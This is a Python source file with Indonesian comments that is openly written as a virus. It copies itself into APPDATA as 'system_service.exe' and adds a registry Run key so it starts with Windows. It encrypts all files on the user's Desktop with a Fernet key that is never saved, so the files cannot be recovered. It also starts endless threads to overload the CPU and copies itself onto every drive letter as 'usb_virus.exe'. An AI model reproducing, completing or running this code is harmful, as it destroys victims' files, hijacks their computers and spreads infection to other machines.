import os
import shutil
import time
import random
import threading
from cryptography.fernet import Fernet  # Untuk enkripsi file


def copy_to_system():
    virus_path = os.path.join(os.environ['APPDATA'], "system_service.exe")
    if not os.path.exists(virus_path):
        shutil.copy(__file__, virus_path)
    
    # Tambahkan ke startup
    os.system(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemService /t REG_SZ /d "{virus_path}" /f')

def overload_cpu():
    while True:
        threading.Thread(target=lambda: [random.random() ** random.random() for _ in range(10**6)]).start()


def encrypt_files(directory, key):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'rb') as f:
                    data = f.read()
                encrypted_data = Fernet(key).encrypt(data)
                with open(file_path, 'wb') as f:
                    f.write(encrypted_data)
            except Exception as e:
                continue


def spread_to_usb():
    drives = [f"{chr(drive)}:\\" for drive in range(65, 91) if os.path.exists(f"{chr(drive)}:\\")]
    for drive in drives:
        try:
            shutil.copy(__file__, os.path.join(drive, "usb_virus.exe"))
        except:
            continue


def main():
    # Membuat kunci untuk enkripsi
    key = Fernet.generate_key()
    
    # Copy virus ke sistem
    copy_to_system()
    
    # Enkripsi file (contoh: di Desktop)
    user_desktop = os.path.join(os.environ['USERPROFILE'], "Desktop")
    threading.Thread(target=encrypt_files, args=(user_desktop, key)).start()
    
    # Overload CPU
    threading.Thread(target=overload_cpu).start()
    
    # Sebarkan ke USB
    threading.Thread(target=spread_to_usb).start()

if __name__ == "__main__":
    main()
